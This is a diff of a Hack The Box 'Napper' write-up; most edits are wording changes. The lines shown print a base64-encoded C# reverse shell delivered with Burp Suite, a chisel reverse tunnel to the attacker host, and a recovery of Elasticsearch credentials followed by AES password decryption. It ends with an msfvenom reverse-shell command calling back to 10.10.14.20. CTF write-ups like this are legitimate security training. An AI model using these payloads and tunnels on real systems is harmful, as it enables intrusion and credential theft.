@@ -208,7 +208,7 @@ We conclude if we send a base64-encoded c# reverse shell it will be decoded by n
 Next step is to download a c# tcp shell from http://www.revshells.com. Bear in mind it cannot be used off-the-self, it needs some modifications.
 1. Namespace must match filename
 2. It must contain a `Run` class
-3. Create a constructor and place the shell code inside
+3. Create a constructor and place the shell code inside, so it is automatically invoked whenever an instance of the class is created. 
 4. The `main()` point of entry will just call the constructor
 
 An example payload could be the following:
@@ -286,7 +286,7 @@ namespace Present
 	}
 }
 ```
-Compile with `mcs`, remember to respect the filename to match the namespace.
+Compile with `mcs`, remember the filename must match the namespace.
 ```markdown
 > mcs -out:Present.exe Present.cs
 
@@ -297,7 +297,7 @@ Encode base64 the resulting binary.
 ```markdown
 > base64 -w 0 ./Present.exe
 ```
-Send the payload with burpsuite, don't forget to encode url to avoid problematic characters.
+Send the payload with burpsuite, don't forget to URL-encode to avoid problematic characters.
 
 ![napper4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/1980268c-79fe-44aa-a94e-cba7f1d47d57)
 
@@ -311,7 +311,7 @@ OS Name:                   Microsoft Windows 10 Pro
 OS Version:                10.0.19045 N/A Build 19045
 System Type:               x64-based PC
 ```
-Enumerating with `winpeas.exe`, a binary in a folder for which we have write access is discovered.
+Enumerating with `winpeas.exe`, a binary is discovered in a folder for which we have write access.
 ```markdown
 > C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe
 ```
@@ -322,23 +322,23 @@ ELASTICUSER=user
 ELASTICPASS=DumpPassword\$Here
 ELASTICURI=https://127.0.0.1:9200
 ```
-We also find a local service running on port 9200, doing some research, this port is owned by elasticsearch. Place a chisel and forward port to kali.
+We also find a local service running on port 9200, doing some research, we find out this port is owned by elasticsearch. Place a chisel and forward port 9200 to kali.
 ```markdown
 ./chisel64 server -p 8000 --reverse
 chisel64.exe client 10.10.14.20:8000 R:9200
 ```
-Browsing the site locally with firefox `https://localhost:9200`, a login website appears.
-Next step is to deompile the `a.exe` file with reversing tool. which turns out to be written in golang.
-Some interesting features found in the source code:
+Browsing the site locally with firefox `https://localhost:9200`, an elasticsearch login website appears.
+Next step is to decompile the `a.exe` file with a reversing tool. The file turns out to have been written in golang.
+Conclusions after inspecting the source code:
 1. If you use ghidra, look for a golang extension to assist in decompile process.
 2. The binary reads environamental variables from the `.env` file. 
-3. In the source you can find credentials for an admin elastic user.
+3. In the source you can find credentials for `elastic` user.
 4. The binary updates password for user `backup`, which is written in a json field called `blob`
 
 ![napper5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b5dc1e65-ab60-4883-9cae-019afdf52890)
 
-Using the `elastic` user ceredentials found in the elasticsearch site, we query the enpoint https://localhost:9200/_search to find the `blob` parameter, which contains the encoded current password for user `backup` and the `seed` used to encode it.
-Once both parameters are retrieved, we can dcode the `backup` user password. For this, we can create our own go script, one good starting point can be found here: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865
+Use the `elastic` user ceredentials to log into the elasticsearch site. Query the https://localhost:9200/_search endpoint to find the `blob` parameter, which contains the encoded current password for user `backup` and the `seed` used to AES encode it.
+Once both parameters are retrieved, we can decode the `backup` user password. For this, it is needed to create our own go script, one good starting point can be found here: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865
 Also, bear in mind that password for user `backup` is updated periodically. Once the password is obtained, we just need to log in as user `backup`. There are no open ports 135, 445, 3389, 5985, so `impacket`, `rdesktop` and `evil-winrm` are discarded. A good alternative could be `runascs` with a `shell.exe` payload generated with `msfvenom`
 ```markdown
 > msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.20 lport=9000 -f exe -a x64 --platform windows -o shell.exe  
